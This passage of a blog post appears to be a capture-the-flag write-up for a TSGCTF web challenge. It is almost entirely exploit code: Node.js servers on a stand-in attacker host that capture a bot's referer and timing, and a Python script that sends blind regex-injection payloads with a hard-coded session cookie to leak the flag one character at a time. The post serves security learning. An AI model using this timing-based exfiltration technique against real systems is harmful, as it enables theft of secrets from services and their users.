<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; performance &#125; = <span class="built_in">require</span>(<span class="string">'perf_hooks'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; URL &#125; = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Get it"</span>);</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    res.writeHead(<span class="number">302</span>, &#123;</span><br><span class="line">      <span class="string">'Location'</span>: <span class="string">'http://ourserver.example.com:8001/?r='</span> + <span class="built_in">encodeURIComponent</span>(req.headers.referer) + <span class="string">'&amp;s='</span> + <span class="built_in">encodeURIComponent</span>(performance.now())</span><br><span class="line">    &#125;);</span><br><span class="line">    res.end();</span><br><span class="line">  &#125;, <span class="number">2000</span>);</span><br><span class="line">  flag = <span class="literal">true</span>;</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server2 = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> URL(req.url, <span class="string">'http://ourserver.example.com:8001'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(url.searchParams.get(<span class="string">'r'</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(performance.now() - <span class="built_in">parseInt</span>(url.searchParams.get(<span class="string">'s'</span>)));</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line">  res.end(<span class="string">'ok\n'</span>);</span><br><span class="line">  flag = <span class="literal">false</span>; </span><br><span class="line">&#125;);</span><br><span class="line">server2.listen(<span class="number">8001</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server3 = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br><span class="line">  <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">    res.end(<span class="string">'Yes'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    res.end(<span class="string">'No'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">server3.listen(<span class="number">8002</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>exp.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(regex)</span>:</span></span><br><span class="line">    burp0_url = <span class="string">"http://35.221.81.216:18364/query"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"rack.session"</span>: <span class="string">"BAh7B0kiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkVlNzI5ZmYxYzNlMGRiYWUxMmU5ZjVlZTdkNTEwNDMwMGY0YzcxNjUzMzM5MmVjNmMzMmJkN2Q5ZTZiZDRlODdmBjsARkkiCXVzZXIGOwBGSSIlYTY2ODZlMTlmNWQ0ZTU0ZGFiNDE5OGMzY2IxN2ZjZDkGOwBG--0895dbb03d0c8d085c5ee28a5d3a50262048d172"</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">                                                 <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Origin"</span>: <span class="string">"http://35.221.81.216:18364"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Referer"</span>: <span class="string">"http://35.221.81.216:18364/report.html"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">    burp0_data = &#123;</span><br><span class="line">        <span class="string">"url"</span>: <span class="string">"http://35.221.81.216:18364/?^(?=&#123;&#125;)((((.*)*)*)*)*saltfwefwefewfwfekorewp#http://ourserver.example.com:8000"</span>.format(regex)&#125;</span><br><span class="line">    session.post(burp0_url, headers=burp0_headers,</span><br><span class="line">                 cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">    time.sleep(<span class="number">6</span>) <span class="comment">#延时5秒都不行...</span></span><br><span class="line">    <span class="keyword">return</span> query_result()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_result</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://ourserver.example.com:8002"</span></span><br><span class="line">    response = requests.get(url=url).text</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Yes'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">''' 判断flag长度</span></span><br><span class="line"><span class="string">lower_bound = 1</span></span><br><span class="line"><span class="string">upper_bound = 40</span></span><br><span class="line"><span class="string">while lower_bound != upper_bound:</span></span><br><span class="line"><span class="string">    m = math.ceil((lower_bound + upper_bound) / 2)</span></span><br><span class="line"><span class="string">    if send_payload(".&#123;&#123;&#123;&#125;&#125;&#125;".format(m)):</span></span><br><span class="line"><span class="string">        lower_bound = m</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        upper_bound = m-1</span></span><br><span class="line"><span class="string">    print("[*] &#123;&#125;, &#123;&#125;".format(lower_bound, upper_bound))</span></span><br><span class="line"><span class="string">secret_length = lower_bound  # = upper_bound</span></span><br><span class="line"><span class="string">print("[+] length: &#123;&#125;".format(secret_length))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">secret_length = <span class="number">24</span> <span class="comment">#已经得到flag长度为24位</span></span><br><span class="line">S = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_&#123;&#125;"</span></span><br><span class="line">secret = <span class="string">""</span></span><br><span class="line"><span class="comment"># 已知flag前7位是TSGCTF&#123;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>, secret_length):</span><br><span class="line">    lower_bound = <span class="number">0</span></span><br><span class="line">    upper_bound = len(S)<span class="number">-1</span></span><br><span class="line">    <span class="keyword">while</span> lower_bound != upper_bound:</span><br><span class="line">        m = (lower_bound + upper_bound) // <span class="number">2</span></span><br><span class="line">        s = S[lower_bound:(m+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">if</span> send_payload(<span class="string">".&#123;"</span> + str(i) + <span class="string">"&#125;["</span> + <span class="string">''</span>.join(list(map(re.escape, s))) + <span class="string">']'</span>):</span><br><span class="line">            upper_bound = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower_bound = m+<span class="number">1</span></span><br><span class="line">        print(<span class="string">"[*] &#123;&#125;, &#123;&#125;"</span>.format(S[lower_bound], S[upper_bound]))</span><br><span class="line">    secret += S[lower_bound]</span><br><span class="line">    print(<span class="string">"[*] &#123;&#125;"</span>.format(secret))        </span><br><span class="line">print(<span class="string">"[+] secret: &#123;&#125;"</span>.format(secret))</span><br></pre></td></tr></table></figure>

<h3 id="References-1"><a href="#References-1" class="headerlink" title="References"></a>References</h3><ul>
<li><a href="https://ctftime.org/writeup/22284" target="_blank" rel="noopener">https://ctftime.org/writeup/22284</a></li>
<li><a href="https://gist.github.com/po6ix/f3c013d974c6003a8dbc573c887602ae" target="_blank" rel="noopener">https://gist.github.com/po6ix/f3c013d974c6003a8dbc573c887602ae</a></li>
<li><a href="https://diary.shift-js.info/blind-regular-expression-injection/#fn:salt" target="_blank" rel="noopener">https://diary.shift-js.info/blind-regular-expression-injection/#fn:salt</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/46294360" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46294360</a></li>
</ul>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2020-07-13</span>
  </div>

  <div class="post-footer">
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
  </body>
</html>